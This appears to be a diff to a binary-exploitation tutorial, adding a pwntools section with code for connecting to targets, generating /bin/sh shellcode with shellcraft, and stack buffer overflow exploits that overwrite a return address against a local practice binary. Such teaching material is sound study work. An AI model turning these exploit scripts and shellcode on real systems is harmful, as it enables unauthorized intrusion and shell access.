@@ -418,15 +418,38 @@ But, the nop-chain will work and help you if there is enough space in the vulner
 
 ## pwntools
 
-pwntools is a exploit development library. 'It is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.'
+pwntools is an exploit development library. 'It is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.'
 
-With pwntools you can connect to the remote target via ssh or just to send some data to the known port. After connection you can execute whatever you want with proper python code.
+With pwntools, you can connect to the remote target via ssh or just to send some data to the known port. After connection, you can execute whatever you want with proper python code.
 
-Explain a little bit:
-- [ ] How to connect to target.
-- [ ] How to make an exploit.
-- [ ] How to write a shellcode faster.
-- [ ] How to write on assembly language through pwntools.
+### Connect to a target
+
+If ssh login is allowed:
+
+```python
+from pwn import *
+
+
+con = ssh(username='username', host='hostname or ip-address', password='password', port=2222)
+# then execute whatever you want
+con.process('/bin/sh')
+con.sendline('echo "hello world!"')
+```
+
+If the target is open port:
+
+```python
+from pwn import *
+
+
+con = remote('hostname or ip-address', port=4444)
+# Receive the data from the port
+print(con.recv())
+# Send a data to the port
+print(con.sendline('A' * 100))
+```
+
+A buffer overflow exploit and jump exploit below.
 
 ### Remote exploit of buffer overflow with pwntools
 
@@ -458,6 +481,7 @@ from pwn import *
 # start the vuln program
 p = process('./stack-overflow')
 # shell function address
+# p32 to convert an address to the little-endian format
 shell_addr = p32(0x080491d6)
 # fill the vuln buffer
 payload = b'A' * 250
@@ -469,4 +493,99 @@ payload += shell_addr
 p.sendline(payload)
 # Shell
 p.interactive()
+```
+
+### Write shellcode faster
+
+You can avoid writing shellcode whenever you need it. Try the `shellcraft` module.
+
+```python
+from pwn import *
+
+# Specify the architecture
+context.arch = 'i386'
+# Create a shellcode
+shellcode = shellcraft.sh()
+print(shellcode)
+# Assembly it
+assembled_shellcode = asm(shellcode)
+print(assembled_shellcode)
+```
+
+Output:
+```bash
+$ python3 fast-shellcode.py
+    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+    /* push b'/bin///sh\x00' */
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx, esp
+    /* push argument array ['sh\x00'] */
+    /* push 'sh\x00\x00' */
+    push 0x1010101
+    xor dword ptr [esp], 0x1016972
+    xor ecx, ecx
+    push ecx /* null terminate */
+    push 4
+    pop ecx
+    add ecx, esp
+    push ecx /* 'sh\x00' */
+    mov ecx, esp
+    xor edx, edx
+    /* call execve() */
+    push SYS_execve /* 0xb */
+    pop eax
+    int 0x80
+
+b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
+```
+
+Now, with this you can do stack-overflow too easy:
+
+```python
+from pwn import *
+
+
+# start the vuln program
+p = process('./stack-overflow')
+# address of the shellcode
+ret_addr = p32(0xffffcf56)
+# specify the architecture and generate the shellcode to execute /bin/sh
+context.arch = 'i386'
+shellcode = asm(shellcraft.sh())
+payload = shellcode
+# add the offset
+payload += b'A' * (262 - len(shellcode))
+# add a new return address
+payload += ret_addr
+# send to process
+p.sendline(payload)
+#gdb.attach(p, "b *main")
+# Shell
+p.interactive()
+```
+
+### Write in an assembly with pwntools shellcraft
+
+Let's code `clean-low-level-shellcode.asm` with pwntools.
+
+```python
+from pwn import *
+
+
+context.arch = 'i386'
+# Just use shellcraft module and its methods which similar to assembly instructions
+shellcode = shellcraft.mov('eax', 0)
+shellcode += shellcraft.push('eax')
+shellcode += shellcraft.push(0x68732f2f)
+shellcode += shellcraft.push(0x6e69622f)
+shellcode += shellcraft.mov('ebx', 'esp')
+shellcode += shellcraft.push('eax')
+shellcode += shellcraft.push('ebx')
+shellcode += shellcraft.mov('ecx', 'esp')
+shellcode += shellcraft.mov('al', 0xb)
+shellcode += shellcraft.syscall()
+print(shellcode)
+print(asm(shellcode))
 ```
